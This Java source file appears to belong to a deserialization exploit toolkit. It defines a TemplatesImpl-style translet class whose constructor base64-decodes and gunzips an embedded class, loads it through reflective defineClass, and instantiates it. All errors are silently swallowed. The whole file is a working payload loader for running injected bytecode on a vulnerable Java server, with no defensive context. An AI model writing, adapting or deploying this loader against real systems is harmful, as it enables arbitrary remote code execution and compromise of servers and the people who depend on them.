package loader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.zip.GZIPInputStream;

/**
 * file
 */
public class CustomizableClassLoader extends AbstractTranslet implements Serializable {

    private static String classBae64Str = null;

    public CustomizableClassLoader(){
        try {
            transletVersion = 101;
            GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(classBae64Str.getBytes())));
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int read;
            while ((read = gzipInputStream.read(buf)) != -1){
                byteArrayOutputStream.write(buf,0,read);
            }
            buf = byteArrayOutputStream.toByteArray();
            ClassLoader loader = new URLClassLoader(new URL[0],Thread.currentThread().getContextClassLoader());
            Method defClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defClassMethod.setAccessible(true);
            Class clazz = (Class) defClassMethod.invoke(loader, buf, 0, buf.length);
            clazz.newInstance();

        } catch (Throwable e) {
            //e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static byte[] base64Decode(byte[] bytes) {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] {
                    byte[].class
            }).invoke(decoder, new Object[] {
                    bytes
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] {
                        String.class
                }).invoke(decoder, new Object[] {
                        new String(bytes)
                });
            } catch (Exception e2) {}
        }
        return value;
    }

}
